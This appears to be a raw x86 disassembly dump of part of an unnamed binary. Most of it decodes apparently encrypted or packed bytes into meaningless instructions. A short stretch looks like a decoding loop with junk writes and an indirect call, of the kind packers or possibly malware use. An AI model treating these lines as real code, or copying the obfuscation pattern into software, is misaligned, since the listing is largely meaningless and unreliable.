  405858:	retf   0xc47a
  40585b:	retf   0x3b54
  40585e:	fld    QWORD PTR [edi-0x3c]
  405861:	xchg   edx,eax
  405862:	cwde   
  405863:	jp     0x40588c
  405865:	repnz xchg edx,eax
  405867:	pop    es
  405868:	aaa    
  405869:	addr16 sti 
  40586b:	mov    BYTE PTR [eax],dh
  40586d:	fadd   DWORD PTR [ebp+0x17]
  405870:	fimul  DWORD PTR [ebx+0x24bf43aa]
  405876:	push   es
  405877:	fstp   DWORD PTR [esi+0x417d41c8]
  40587d:	and    al,0xd
  40587f:	(bad)  
  405880:	mov    WORD PTR [eax+0x1d6f54ca],?
  405886:	aas    
  405887:	xchg   esi,eax
  405888:	test   BYTE PTR ds:0xa74c2f75,0x66
  40588f:	pop    ebx
  405890:	adc    edi,esp
  405892:	loopne 0x40581e
  405894:	(bad)  
  405895:	pop    eax
  405896:	sbb    edx,DWORD PTR [eax-0x32]
  405899:	mov    ds:0x259bfa66,eax
  40589e:	push   0xffffffa0
  4058a0:	push   esp
  4058a1:	clc    
  4058a2:	cmp    eax,0x3576f2d6
  4058a7:	ins    BYTE PTR es:[edi],dx
  4058a8:	xor    DWORD PTR ss:[ecx],edi
  4058ab:	fwait
  4058ac:	(bad)  
  4058ad:	fs sbb ah,ch
  4058b0:	mov    al,0x43
  4058b2:	(bad)  
  4058b3:	and    ah,al
  4058b5:	cwde   
  4058b6:	mov    ebx,0xb88712d2
  4058bb:	mov    dl,0x57
  4058bd:	inc    ebx
  4058be:	les    ebx,FWORD PTR [esi+0x7d]
  4058c1:	dec    ecx
  4058c2:	inc    BYTE PTR [eax+edi*4-0x34]
  4058c6:	and    ch,ch
  4058c8:	inc    ebp
  4058c9:	jnp    0x40590b
  4058cb:	inc    ebp
  4058cc:	mov    ah,0xc7
  4058ce:	shl    esp,0x2f
  4058d1:	adc    eax,0xd381117
  4058d6:	in     al,0x51
  4058d8:	and    DWORD PTR [eax+0x47867a4b],ebp
  4058de:	loopne 0x405945
  4058e0:	push   ds
  4058e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e3:	and    BYTE PTR [edx],ch
  4058e5:	mov    ch,0x43
  4058e7:	mov    DWORD PTR [edi-0x15ff7e85],edi
  4058ed:	call   0xe67b:0x32de0bb7
  4058f4:	pop    edi
  4058f5:	mov    ch,BYTE PTR [ecx-0x2d]
  4058f8:	cwde   
  4058f9:	pop    ss
  4058fa:	shl    BYTE PTR [ecx+0x52],0x4e
  4058fe:	gs addr16 das 
  405901:	dec    esi
  405902:	aam    0x3b
  405904:	dec    edi
  405905:	fs js  0x405899
  405908:	mov    WORD PTR [esi+0x52],?
  40590b:	rcr    DWORD PTR [esi],1
  40590d:	sub    DWORD PTR [ebx+0x22],eax
  405910:	xchg   edi,eax
  405911:	xchg   ebp,eax
  405912:	cmp    bl,al
  405914:	lea    ebx,[edi]
  405916:	jb     0x405949
  405918:	in     eax,0xd3
  40591a:	inc    esp
  40591b:	push   eax
  40591c:	sub    BYTE PTR [edx+eax*1-0x3cc95baf],0x54
  405924:	mov    WORD PTR [ebx],cs
  405926:	mov    BYTE PTR [ecx],cl
  405928:	inc    esp
  405929:	popa   
  40592a:	repz fucomp st(1)
  40592d:	and    DWORD PTR [eax+eax*1-0x19],esp
  405931:	sar    DWORD PTR [ecx-0x4e],cl
  405934:	inc    ebx
  405935:	call   0xd58e:0x4c06e7e2
  40593c:	das    
  40593d:	cmp    DWORD PTR [eax],esi
  40593f:	sbb    DWORD PTR [eax-0x3f],edi
  405942:	leave  
  405943:	push   cs
  405944:	add    eax,0x6f473c37
  405949:	jbe    0x4058f8
  40594b:	sbb    eax,0x64df903
  405950:	mov    eax,ds:0x8dee4512
  405955:	inc    edi
  405956:	or     bh,BYTE PTR [edx]
  405958:	dec    ebp
  405959:	fs fwait
  40595b:	cmp    DWORD PTR [ecx+0x3b],ebx
  40595e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40595f:	or     eax,0x2177f2af
  405964:	loop   0x405961
  405966:	mov    ah,0xc7
  405968:	jg     0x4059cc
  40596a:	xor    eax,0xf9c4d00c
  40596f:	stos   BYTE PTR es:[edi],al
  405970:	push   0x336ce2ea
  405975:	ins    BYTE PTR es:[edi],dx
  405976:	mov    al,ds:0x5ee96181
  40597b:	mov    ecx,0x96d7c10d
  405980:	jg     0x405942
  405982:	dec    edx
  405983:	sbb    DWORD PTR [ecx-0x3aa19c7c],ebx
  405989:	ins    DWORD PTR es:[edi],dx
  40598a:	dec    eax
  40598b:	jb     0x40593b
  40598d:	push   edi
  40598e:	dec    ebx
  40598f:	mov    BYTE PTR [esi],cl
  405991:	add    eax,0xf1f9d7a7
  405996:	clc    
  405997:	retf   
  405998:	inc    esi
  405999:	daa    
  40599a:	push   ds
  40599b:	and    BYTE PTR [edx+0x3082b05b],al
  4059a1:	pop    ebx
  4059a2:	sub    BYTE PTR [edi+0x30c0987c],al
  4059a8:	loopne 0x4059c2
  4059aa:	mov    ecx,ebp
  4059ac:	dec    ecx
  4059ad:	pop    ds
  4059ae:	xchg   DWORD PTR [edx],eax
  4059b0:	mov    edx,0x44226411
  4059b5:	loope  0x405979
  4059b7:	ror    ch,cl
  4059b9:	aad    0x5c
  4059bb:	xor    eax,0xe9bc3dba
  4059c0:	dec    ebp
  4059c1:	push   edx
  4059c2:	mov    esi,0x6775bf
  4059c7:	repz test eax,0x54fa1d9f
  4059cd:	or     al,0x44
  4059cf:	add    al,0x82
  4059d1:	fsubr  QWORD PTR ds:0x7b9aecc1
  4059d7:	xchg   esi,eax
  4059d8:	push   ebp
  4059d9:	adc    BYTE PTR [esi+0x55ff5ce3],bh
  4059df:	mov    bl,0x60
  4059e1:	xchg   ecx,eax
  4059e2:	mov    dh,ah
  4059e4:	xchg   ebp,eax
  4059e5:	inc    esi
  4059e6:	loop   0x4059bd
  4059e8:	add    al,0x24
  4059ea:	test   al,0xd8
  4059ec:	add    ch,al
  4059ee:	xor    ebx,DWORD PTR [ebp+0xf93f7b2]
  4059f4:	cs jnp 0x405a06
  4059f7:	shr    DWORD PTR [ebx+ecx*1+0x62291a81],0x6
  4059ff:	call   0x6e3177c4
  405a04:	push   cs
  405a05:	add    esi,DWORD PTR [esi-0xb9e6edb]
  405a0b:	int    0xf6
  405a0d:	lds    ebx,FWORD PTR [ecx]
  405a0f:	jns    0x405a32
  405a11:	pop    edx
  405a12:	adc    edi,0x76
  405a15:	(bad)  
  405a16:	pop    ebp
  405a17:	jnp    0x4059fd
  405a19:	inc    ecx
  405a1a:	enter  0x8c2a,0x32
  405a1e:	mov    edi,eax
  405a20:	jge    0x405a06
  405a22:	cmp    DWORD PTR [eax-0x41],ebx
  405a25:	cli    
  405a26:	sbb    DWORD PTR [esi-0x14],0xee1a3eef
  405a2d:	push   edx
  405a2e:	bound  edi,QWORD PTR [esp+ecx*2]
  405a31:	fwait
  405a32:	and    al,BYTE PTR [ebx+0x20ad3422]
  405a38:	imul   ecx,DWORD PTR [edx+esi*2-0xbe73b00],0x99180ec3
  405a43:	adc    DWORD PTR [esi+eiz*1],ebx
  405a46:	xor    BYTE PTR [esi],ch
  405a48:	sub    BYTE PTR [edx],0x27
  405a4b:	jno    0x4059dc
  405a4d:	(bad)  
  405a4e:	in     al,dx
  405a4f:	jnp    0x405aaf
  405a51:	lods   eax,DWORD PTR ds:[esi]
  405a52:	mov    ebx,0x74fc9830
  405a57:	mov    eax,0x1637e18b
  405a5c:	inc    eax
  405a5d:	repnz add bl,dl
  405a60:	dec    eax
  405a61:	adc    al,0x8c
  405a63:	push   0x1a575fad
  405a68:	ud1    eax,DWORD PTR [ebp+eax*2+0x396945d9]
  405a70:	push   ebx
  405a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a72:	xchg   edi,eax
  405a73:	jecxz  0x405a39
  405a75:	jmp    0x405aa3
  405a77:	add    eax,DWORD PTR [edi+0x18]
  405a7a:	cmp    ch,BYTE PTR [edx+0x56]
  405a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a7e:	leave  
  405a7f:	mov    eax,0x746a2ac4
  405a84:	xchg   edi,eax
  405a85:	mov    ch,0x93
  405a87:	repnz add ah,BYTE PTR [esi]
  405a8a:	fs addr16 jns 0x405a42
  405a8e:	mov    esi,0x270c8c00
  405a93:	inc    ebp
  405a94:	xchg   BYTE PTR [ecx+0x36],dl
  405a97:	mov    dh,0x50
  405a99:	icebp  
  405a9a:	pop    esi
  405a9b:	push   0x30
  405a9d:	adc    DWORD PTR [edi+esi*2-0x57],0x6581ed0
  405aa5:	inc    ebx
  405aa6:	imul   ecx,DWORD PTR [edi-0x4e66d509],0x70
  405aad:	dec    ebp
  405aae:	fwait
  405aaf:	cmp    al,0x41
  405ab1:	out    0xf1,al
  405ab3:	fisubr WORD PTR [eax+eiz*8]
  405ab6:	xchg   esi,eax
  405ab7:	stos   DWORD PTR es:[edi],eax
  405ab8:	sub    DWORD PTR [edi-0x20da29bc],ecx
  405abe:	mov    eax,ds:0xb766bd5
  405ac3:	(bad)  
  405ac4:	mov    al,0xd6
  405ac6:	imul   ebx,DWORD PTR [ebx],0x10
  405ac9:	or     ah,BYTE PTR [edi]
  405acb:	sub    eax,0x20ff2551
  405ad0:	outs   dx,DWORD PTR ds:[esi]
  405ad1:	inc    eax
  405ad2:	imul   DWORD PTR [ebx+0xb64f7d5]
  405ad8:	or     edi,DWORD PTR [ebx+ebp*2-0x16ec505f]
  405adf:	aas    
  405ae0:	xor    BYTE PTR [ebx+0x53],0x65
  405ae4:	imul   esi,DWORD PTR ds:[esi-0x70],0x7c
  405ae9:	sbb    dh,dl
  405aeb:	retf   0xccdf
  405aee:	dec    esi
  405aef:	cmp    DWORD PTR [ebp+0xd],esp
  405af2:	or     bl,BYTE PTR [ecx]
  405af4:	dec    esi
  405af5:	mov    ds:0xed97cd3b,eax
  405afa:	dec    esp
  405afb:	mov    al,0xdc
  405afd:	add    ecx,DWORD PTR [edx]
  405aff:	sbb    dh,BYTE PTR [eax-0x28]
  405b02:	fmul   QWORD PTR [ebp+0x5cb7b124]
  405b08:	mov    esi,0xe5e527ce
  405b0d:	data16 mov dl,0xe5
  405b10:	push   eax
  405b11:	adc    eax,0x9723b0f3
  405b16:	je     0x405b6f
  405b18:	push   0x3
  405b1a:	push   es
  405b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b1c:	mov    al,ds:0x764d16c6
  405b21:	shl    BYTE PTR [ebx-0x450f51a0],1
  405b27:	xor    al,0x4
  405b29:	in     eax,0x1d
  405b2b:	mov    eax,0x111f0c1e
  405b30:	mov    bl,BYTE PTR [edi-0x71]
  405b33:	or     DWORD PTR [edx],edx
  405b35:	(bad)  
  405b36:	icebp  
  405b37:	clc    
  405b38:	push   eax
  405b39:	fdiv   QWORD PTR [ecx]
  405b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b3c:	(bad)  
  405b3d:	aad    0x5d
  405b3f:	vpmadcsswd ymm6,ymm2,YMMWORD PTR [eax],ymm0
  405b45:	adc    bl,al
  405b47:	(bad)  
  405b48:	push   0xffffffbd
  405b4a:	sub    edi,eax
  405b4c:	ror    BYTE PTR [edx-0x164e8222],1
  405b52:	mov    esi,0x11ed6b3f
  405b57:	inc    ecx
  405b58:	push   ecx
  405b59:	or     eax,0x47450a37
  405b5e:	and    BYTE PTR [edx+0x32],cl
  405b61:	lock adc dl,BYTE PTR ds:[ecx]
  405b65:	mov    ebp,0x20c32af9
  405b6a:	fimul  WORD PTR [eax-0x7d822494]
  405b70:	lock cmp eax,ebx
  405b73:	dec    esp
  405b74:	jne    0x405bad
  405b76:	pop    edx
  405b77:	xor    eax,ebp
  405b79:	inc    ebp
  405b7a:	push   cs
  405b7b:	jecxz  0x405bd3
  405b7d:	fist   WORD PTR [ebp+0x4b]
  405b80:	push   ds
  405b81:	jne    0x405be5
  405b83:	scas   al,BYTE PTR es:[edi]
  405b84:	jnp    0x405b4f
  405b86:	inc    esi
  405b87:	pop    ds
  405b88:	cmp    eax,0x22ce9927
  405b8d:	xor    al,0xa
  405b8f:	mov    DWORD PTR [esi+0x7e9abfc8],edx
  405b95:	sub    edx,0x6e
  405b98:	sub    dl,BYTE PTR [ecx+eiz*4+0x44133cb6]
  405b9f:	push   ebx
  405ba0:	mov    edx,0xe19d09f0
  405ba5:	fs or  eax,0xbcd7320
  405bab:	mov    al,0xf1
  405bad:	add    edi,ebx
  405baf:	xchg   BYTE PTR [ecx-0x22],ch
  405bb2:	adc    bl,BYTE PTR [ebp+0x50]
  405bb5:	and    al,cl
  405bb7:	mov    cl,0x56
  405bb9:	inc    esi
  405bba:	sbb    dh,BYTE PTR [ebp+ebx*2+0x7a]
  405bbe:	mov    al,0x5e
  405bc0:	mov    esp,0xdf79dd9d
  405bc5:	outs   dx,BYTE PTR ds:[esi]
  405bc6:	xchg   esp,eax
  405bc7:	aad    0xc2
  405bc9:	aaa    
  405bca:	sbb    BYTE PTR [ecx-0x4f],dh
  405bcd:	lea    esi,[esi-0xb929e68]
  405bd3:	jmp    0x446edda
  405bd8:	js     0x405c37
  405bda:	xchg   edi,eax
  405bdb:	jmp    0x2b50f9dd
  405be0:	sub    eax,0x24b3306
  405be5:	xor    eax,0x17079da8
  405bea:	popf   
  405beb:	int3   
  405bec:	test   eax,0x5a849f3
  405bf1:	sub    bh,bh
  405bf3:	(bad)  
  405bf4:	stc    
  405bf5:	nop
  405bf6:	call   0x61f13bd4
  405bfb:	fisubr WORD PTR [edi]
  405bfd:	ins    BYTE PTR es:[edi],dx
  405bfe:	cwde   
  405bff:	fiadd  DWORD PTR [ebp-0x17]
  405c02:	into   
  405c03:	sub    DWORD PTR [esi+0x7118f963],ebx
  405c09:	push   edx
  405c0a:	cli    
  405c0b:	stc    
  405c0c:	jns    0x405c27
  405c0e:	bound  edx,QWORD PTR [edi+0x68]
  405c11:	out    0xf4,al
  405c13:	call   0xa135:0x2956e16b
  405c1a:	sbb    bl,ch
  405c1c:	rol    BYTE PTR [ebp-0x43],0x8c
  405c20:	pop    es
  405c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c22:	xor    eax,0xdc2eb510
  405c27:	enter  0x4042,0x8a
  405c2b:	inc    ebp
  405c2c:	sub    edi,DWORD PTR [eax]
  405c2e:	and    al,0x5a
  405c30:	and    esi,DWORD PTR [edi+0x38ff7898]
  405c36:	leave  
  405c37:	fidivr WORD PTR [esi-0x70]
  405c3a:	adc    eax,0x75c4950e
  405c3f:	xor    BYTE PTR [edx+eiz*8-0x6d],bl
  405c43:	pop    edx
  405c44:	pop    ds
  405c45:	(bad)  
  405c48:	repnz bound ebp,QWORD PTR [edx-0x65d31ccf]
  405c4f:	int    0x12
  405c51:	push   ebp
  405c52:	and    cl,BYTE PTR [edi]
  405c54:	push   es
  405c55:	rol    BYTE PTR [eax],1
  405c57:	clc    
  405c58:	jo     0x405c94
  405c5a:	mov    WORD PTR ds:0xa4f0dd55,ds
  405c60:	inc    edi
  405c61:	sahf   
  405c62:	add    eax,0xee624384
  405c67:	test   DWORD PTR [esi+0x8fa5b49],ecx
  405c6d:	sahf   
  405c6e:	add    edx,DWORD PTR [ebp+0x3c0fbcff]
  405c74:	mov    dh,BYTE PTR [esi-0x24437220]
  405c7a:	or     al,0x1
  405c7c:	jo     0x405cb1
  405c7e:	(bad)  
  405c7f:	stos   DWORD PTR es:[edi],eax
  405c80:	sub    bh,BYTE PTR [ebp-0x4fb0910a]
  405c86:	pushf  
  405c87:	test   al,0x8a
  405c89:	bound  edi,QWORD PTR [edi-0x1a]
  405c8c:	add    eax,0xdd509754
  405c91:	dec    edi
  405c92:	mov    ah,0x19
  405c94:	in     al,0xf2
  405c96:	mov    ecx,0x810bfb27
  405c9b:	dec    esp
  405c9c:	popf   
  405c9d:	ja     0x405cd8
  405c9f:	mov    ds:0x5c6c6aee,eax
  405ca4:	clc    
  405ca5:	and    al,0x97
  405ca7:	sub    eax,0x34d55996
  405cac:	inc    ebx
  405cad:	loope  0x405c33
  405caf:	xor    BYTE PTR [edi],ch
  405cb1:	fucom  st(3)
  405cb3:	pusha  
  405cb4:	outs   dx,DWORD PTR ds:[esi]
  405cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb6:	adc    al,0xb1
  405cb8:	mov    bl,0x2c
  405cba:	add    eax,0x71a4e3c4
  405cbf:	jp     0x405d23
  405cc1:	add    eax,esp
  405cc3:	jp     0x405cb5
  405cc5:	loopne 0x405d23
  405cc7:	add    eax,0x8c6c5d63
  405ccc:	test   BYTE PTR [edi+0x2b],cl
  405ccf:	test   al,0xa8
  405cd1:	push   edi
  405cd2:	fcomp  DWORD PTR [esi+0x4b]
  405cd5:	dec    ebx
  405cd6:	mov    ebp,0x9225cb9f
  405cdb:	jne    0x405cc4
  405cdd:	sbb    BYTE PTR [ebx],ch
  405cdf:	fcmovb st,st(7)
  405ce1:	push   0xe08ddd82
  405ce6:	or     cl,al
  405ce8:	xchg   ebp,eax
  405ce9:	mov    esi,0x79d4bb3f
  405cee:	adc    DWORD PTR [ecx],esp
  405cf0:	outs   dx,DWORD PTR ds:[esi]
  405cf1:	ss mov ds:0xbee7eda,eax
  405cf8:	xor    eax,0x2b2e4495
  405cfd:	mov    ecx,DWORD PTR [edi]
  405cff:	add    al,0xbd
  405d01:	shl    eax,cl
  405d03:	test   BYTE PTR [ebp+0x7b],0x7
  405d07:	sbb    al,0x34
  405d09:	cmp    dl,BYTE PTR [esi]
  405d0b:	shl    DWORD PTR [edi],cl
  405d0d:	out    dx,eax
  405d0e:	imul   edx,DWORD PTR [edx+0x7a],0x53d163f1
  405d15:	xlat   BYTE PTR ds:[ebx]
  405d16:	sbb    al,0x7c
  405d18:	push   ebp
  405d19:	ret    0x5d7d
  405d1c:	sbb    edx,DWORD PTR [edi+0x57846c06]
  405d22:	(bad)  
  405d23:	cmc    
  405d24:	in     eax,dx
  405d25:	test   DWORD PTR [edi+0x2891a81a],0x92ff1afb
  405d2f:	movups xmm2,xmm7
  405d32:	pop    eax
  405d33:	mov    cl,BYTE PTR [eax+0x6ead7bdf]
  405d39:	push   es
  405d3a:	clc    
  405d3b:	in     eax,dx
  405d3c:	sub    edi,esi
  405d3e:	call   0x5be2736
  405d43:	stos   DWORD PTR es:[edi],eax
  405d44:	mov    eax,0x458b81a3
  405d49:	fmul   DWORD PTR [ebx+0x15f7e84d]
  405d4f:	fisub  DWORD PTR [edx-0x39ccffbe]
  405d55:	or     DWORD PTR ds:0x42a2fa,0xa4f
  405d5f:	xor    ecx,esi
  405d61:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  405d6b:	add    eax,edi
  405d6d:	add    ecx,edi
  405d6f:	mov    BYTE PTR [ebp-0x21],dl
  405d72:	cmp    eax,ecx
  405d74:	jae    0x408235
  405d7a:	add    edx,DWORD PTR ds:0x42a2a2
  405d80:	lea    ecx,[eax-0x3272f1]
  405d86:	mov    DWORD PTR [ebp-0x14],ecx
  405d89:	sub    DWORD PTR ds:0x42a27a,0x2374
  405d93:	mov    edx,DWORD PTR [ebp-0x14]
  405d96:	add    DWORD PTR ds:0x42a2a2,0x6412
  405da0:	xor    edx,esi
  405da2:	add    edx,0x7f55d8fb
  405da8:	lea    ecx,[ebp+eax*4-0xb4]
  405daf:	mov    DWORD PTR ds:0x42a25a,0x798e
  405db9:	mov    DWORD PTR [ecx],edx
  405dbb:	mov    edx,0x1097
  405dc0:	mov    edx,DWORD PTR [ecx]
  405dc2:	cmp    edx,0x244ecb98
  405dc8:	jbe    0x405de3
  405dce:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  405dd8:	add    DWORD PTR [ecx],0x405fcd9
  405dde:	jmp    0x405de9
  405de3:	add    DWORD PTR [ecx],0xfdaf4327
  405de9:	or     DWORD PTR ds:0x42a2f6,edi
  405def:	mov    ecx,DWORD PTR [ebp-0x18]
  405df2:	xor    ecx,esi
  405df4:	and    DWORD PTR ds:0x42a25e,0x42a27a
  405dfe:	inc    eax
  405dff:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  405e09:	inc    DWORD PTR [ebp-0x14]
  405e0c:	add    ecx,edi
  405e0e:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  405e18:	cmp    eax,ecx
  405e1a:	mov    DWORD PTR ds:0x42a2fe,0x33af
  405e24:	jb     0x405d89
  405e2a:	and    DWORD PTR ds:0x42a25e,0x0
  405e34:	mov    eax,ds:0x42a25e
  405e39:	inc    eax
  405e3a:	mov    ds:0x42a25e,eax
  405e3f:	cmp    DWORD PTR ds:0x42a25e,0x1c
  405e46:	jge    0x405e81
  405e4c:	jmp    0x405e74
  405e51:	push   0x42a28e
  405e56:	push   0x8ee8
  405e5b:	push   DWORD PTR [ebp-0xc]
  405e5e:	push   0x2324
  405e63:	push   0x4718
  405e68:	push   DWORD PTR [ebp-0x20]
  405e6b:	push   DWORD PTR [ebp-0x18]
  405e6e:	call   DWORD PTR ds:0x42a3ce
  405e74:	cmp    DWORD PTR ds:0x42a25e,0x18
  405e7b:	jb     0x405e34
  405e81:	mov    dl,BYTE PTR [ebp-0x21]
  405e84:	jmp    0x408235
  405e89:	test   eax,0xe897f33e
  405e8e:	add    BYTE PTR [ecx-0x2fc9eefa],0xf5
  405e95:	lods   al,BYTE PTR ds:[esi]
  405e96:	fild   DWORD PTR [ebx+ecx*4-0x7c7cc5a5]
  405e9d:	out    dx,eax
  405e9e:	pop    esi
  405e9f:	add    DWORD PTR [ebx+0x6522925f],0xffffffa7
  405ea6:	ins    DWORD PTR es:[edi],dx
  405ea7:	mov    bh,0x1e
  405ea9:	lock icebp 
  405eab:	fisttp DWORD PTR [esi+0x3ed727ef]
  405eb1:	call   0x8e0c6616
  405eb6:	sub    DWORD PTR [edi],edi
  405eb8:	cmp    bh,bl
  405eba:	jmp    0x3ad2:0x4b6f33b6
  405ec1:	mov    edi,0x19f631f
  405ec6:	xchg   dl,dl
  405ec8:	je     0x405ea3
  405eca:	dec    esp
  405ecb:	inc    eax
  405ecc:	test   al,0x74
  405ece:	sahf   
  405ecf:	ja     0x405e65
  405ed1:	call   0xe48:0x1d07f0e2
  405ed8:	imul   ecx,DWORD PTR [edx-0x34f5a09d],0x53d1bcb9
  405ee2:	xchg   edi,eax
  405ee3:	outs   dx,DWORD PTR ds:[esi]
  405ee4:	sub    ebx,edi
  405ee6:	(bad)  
  405ee7:	into   
  405ee8:	pop    ds
  405ee9:	mov    ch,BYTE PTR [ebx]
  405eeb:	lock and eax,esp
  405eee:	mov    DWORD PTR [edx-0x7bfd5ba9],edi
  405ef4:	sub    ecx,esp
  405ef6:	mov    ds:0x20012fb7,al
  405efb:	aas    
  405efc:	mov    ah,0x99
  405efe:	dec    bx
  405f00:	push   ebp
  405f01:	jp     0x405f34
  405f03:	pop    ebx
  405f04:	(bad)  
  405f05:	(bad)  
  405f08:	sub    DWORD PTR [ebp+0x55],ebx
  405f0b:	and    bl,BYTE PTR [edx-0x2]
  405f0e:	mov    edi,0xcadcd24f
  405f13:	(bad)  
  405f14:	mov    bh,0x81
  405f16:	dec    ebp
  405f17:	jmp    0x405ec8
  405f19:	das    
  405f1a:	out    0x7a,eax
  405f1c:	call   FWORD PTR [ebp+0x37]
  405f1f:	inc    eax
  405f20:	sub    edx,edx
  405f22:	mov    ch,0xac
  405f24:	add    BYTE PTR [ecx-0x7a],dh
  405f27:	jge    0x405ec4
  405f29:	icebp  
  405f2a:	gs gs dec ecx
  405f2d:	push   esi
  405f2e:	mov    ch,0x73
  405f30:	retf   0x87d5
  405f33:	ret    0x81f8
  405f36:	and    al,0x51
  405f38:	icebp  
  405f39:	sti    
  405f3a:	add    al,0xea
  405f3c:	add    al,0x8
  405f3e:	sub    BYTE PTR [esi+0xf655c42],cl
  405f44:	ins    BYTE PTR es:[edi],dx
  405f45:	dec    esp
  405f46:	pop    edx
  405f47:	outs   dx,DWORD PTR ds:[esi]
  405f48:	sub    eax,0x1d00bfa5
  405f4d:	(bad)  
  405f4e:	lods   al,BYTE PTR ds:[esi]
  405f4f:	jle    0x405f93
  405f51:	push   ebx
  405f52:	dec    esi
  405f53:	xchg   edx,eax
  405f54:	ror    DWORD PTR [eax+edx*2+0x38a1f994],1
  405f5b:	sbb    al,0xc7
  405f5d:	call   0x72d4:0xbfb0fa3e
  405f64:	cli    
  405f65:	mov    cl,0xbb
  405f67:	mov    esi,0xdabbf78a
  405f6c:	or     cl,BYTE PTR [edx-0x3a]
  405f6f:	dec    edi
  405f70:	jns    0x405f25
  405f72:	pop    ds
  405f73:	icebp  
  405f74:	lods   al,BYTE PTR ds:[esi]
  405f75:	shl    BYTE PTR [edx],cl
  405f77:	add    al,0x7b
  405f79:	jo     0x405f92
  405f7b:	push   ebx
  405f7c:	fidivr WORD PTR [edi+0x730de76e]
  405f82:	jnp    0x405fef
  405f84:	pop    ebx
  405f85:	adc    eax,0xededb98e
  405f8a:	scas   al,BYTE PTR es:[edi]
  405f8b:	in     al,0x63
  405f8d:	test   BYTE PTR [ecx-0x35c50969],dl
  405f93:	sub    al,0x45
  405f95:	cmp    al,0x0
  405f97:	out    dx,eax
  405f98:	inc    ecx
  405f99:	mov    edx,0x4adb0518
  405f9e:	ret    0xa079
  405fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa2:	(bad)  
  405fa3:	cli    
  405fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fa5:	mov    al,0xc
  405fa7:	or     eax,0x4e852c30
  405fac:	jnp    0x406005
  405fae:	sub    eax,0xb20d864
  405fb3:	mov    ebp,0x155e102a
  405fb8:	inc    ebp
  405fb9:	fisubr WORD PTR [edx+ecx*2]
  405fbc:	gs cs mov ebx,esp
  405fc0:	dec    esp
  405fc1:	mov    bh,0xaf
  405fc3:	dec    DWORD PTR [ecx-0x4bae3c0d]
  405fc9:	fild   WORD PTR [ecx+0x72]
  405fcc:	push   ecx
  405fcd:	inc    eax
  405fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fcf:	pop    esi
  405fd0:	push   0xfd3b207b
  405fd5:	fist   WORD PTR [edi-0x5737ae88]
  405fdb:	adc    edx,ebx
  405fdd:	mov    ebp,0x41571674
  405fe2:	outs   dx,BYTE PTR ds:[esi]
  405fe3:	dec    esp
  405fe4:	bound  ebp,QWORD PTR [eax-0x4e]
  405fe7:	cmp    DWORD PTR ds:0x37f6464a,eax
  405fed:	call   0x683075e9
  405ff2:	out    0x3e,eax
  405ff4:	jle    0x405f9c
  405ff6:	ror    BYTE PTR [edi-0x63],cl
  405ff9:	inc    ecx
  405ffa:	sbb    edi,edi
  405ffc:	mov    dh,0x97
  405ffe:	fsub   QWORD PTR ds:0x6d87f86a
  406004:	inc    BYTE PTR [ecx]
  406006:	inc    ebp
  406007:	lock mov dh,0x44
  40600a:	out    dx,al
  40600b:	out    dx,al
  40600c:	push   esi
  40600d:	jo     0x40605c
  40600f:	mov    dh,BYTE PTR [ecx]
  406011:	mov    ch,0xf9
  406013:	in     al,0x15
  406015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406016:	push   edx
  406017:	data16 (bad) 
  406019:	fistp  DWORD PTR [edi]
  40601b:	fwait
  40601c:	(bad)  
  40601d:	pop    ecx
  40601e:	inc    edx
  40601f:	pop    ebx
  406020:	pop    edx
  406021:	call   0xdece:0xf29c1534
  406028:	sti    
  406029:	jnp    0x406086
  40602b:	inc    esp
  40602c:	in     al,dx
  40602d:	mov    WORD PTR [ecx],?
  40602f:	dec    esi
  406030:	push   eax
  406031:	test   DWORD PTR [edi-0x7f330f40],edx
  406037:	mov    ch,0x96
  406039:	lods   eax,DWORD PTR ds:[esi]
  40603a:	sahf   
  40603b:	add    BYTE PTR [ecx+0x52a41a51],0x8c
  406042:	stos   BYTE PTR es:[edi],al
  406043:	sbb    esi,DWORD PTR ds:0x689b9a04
  406049:	in     al,dx
  40604a:	xor    al,BYTE PTR [ecx]
  40604c:	int    0x8d
  40604e:	pop    ss
  40604f:	sbb    eax,0xadc7d504
  406054:	out    dx,al
  406055:	pinsrw mm7,WORD PTR [ebp-0x3d08a651],0x23
  40605d:	adc    BYTE PTR [eax+0x308cb9dc],al
  406063:	mov    edi,0x1dece8ed
  406068:	jg     0x405ff0
  40606a:	jl     0x406025
  40606c:	inc    ebx
  40606d:	jmp    edi
  40606f:	add    al,0xed
  406071:	xlat   BYTE PTR ds:[ebx]
  406072:	int    0x24
  406074:	call   0x85289f13
  406079:	jae    0x40604a
  40607b:	push   ebp
  40607c:	push   ds
  40607d:	push   0x9eb68b9b
  406082:	inc    esi
  406083:	jp     0x406093
  406085:	add    al,0xdc
  406087:	call   0xcee2:0x28ea4c46
  40608e:	retf   
  40608f:	mov    cl,0x3c
  406091:	mov    ch,0xb3
  406093:	mov    ds:0xd36980ce,al
  406098:	push   ecx
  406099:	xchg   DWORD PTR [edi+0x29d361fa],ebx
  40609f:	add    eax,DWORD PTR [ecx-0x74]
  4060a2:	cld    
  4060a3:	and    eax,0x3f6088a1
  4060a8:	mov    cl,0xc8
  4060aa:	not    DWORD PTR ds:0xf0b68250
  4060b0:	fist   DWORD PTR [ecx]
  4060b2:	and    BYTE PTR [edx],dh
  4060b4:	xchg   ebx,eax
  4060b5:	and    eax,0xc2318f07
  4060ba:	loopne 0x40613b
  4060bc:	int3   
  4060bd:	mov    ebx,0x66554efb
  4060c2:	les    ebx,FWORD PTR [edi-0x5d]
  4060c5:	adc    esp,esi
  4060c7:	add    al,0x5a
  4060c9:	dec    esi
